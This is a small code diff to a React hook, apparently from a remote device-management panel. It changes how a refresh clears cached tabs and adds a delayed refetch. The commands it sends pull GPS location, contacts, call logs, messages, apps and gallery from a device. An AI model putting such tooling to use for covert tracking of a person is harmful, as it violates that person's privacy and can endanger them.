@@ -176,21 +176,22 @@ export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string
     activeTab, setActiveTab, loading, isRefreshing, toast: null, isLiveMovement,
     handleFullRefresh: async () => {
       setIsRefreshing(true); toast.request("Refreshing GPS & enabled tabs...");
-      sendCommand("fetch_location", {}, "Fresh GPS");
+      tabCache.clear(); sendCommand("fetch_location", {}, "Fresh GPS");
       const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
       const tasks: Promise<any>[] = [fetchLightStatus()];
       for (const [tab, cmd] of Object.entries(syncMap)) {
         if (checkTabEnabled && checkTabEnabled(tab)) {
-          tabCache.delete(`${deviceId}:${tab}`);
           sendCommand(cmd, {}, `Sync ${tab}`);
           tasks.push(fetchTabData(tab, true, true));
         }
       }
-      if (checkTabEnabled && checkTabEnabled(activeTab) && !syncMap[activeTab]) {
-        tabCache.delete(`${deviceId}:${activeTab}`);
-        tasks.push(fetchTabData(activeTab, true, true));
-      }
       await Promise.all(tasks);
+      setTimeout(() => {
+        fetchLightStatus();
+        for (const tab of Object.keys(syncMap)) {
+          if (checkTabEnabled && checkTabEnabled(tab)) fetchTabData(tab, true, true);
+        }
+      }, 2500);
       toast.success("Fresh GPS & data requested"); setIsRefreshing(false);
     },
     fetchTabData, handleToggleLiveMovement, sendCommand, ...actions,
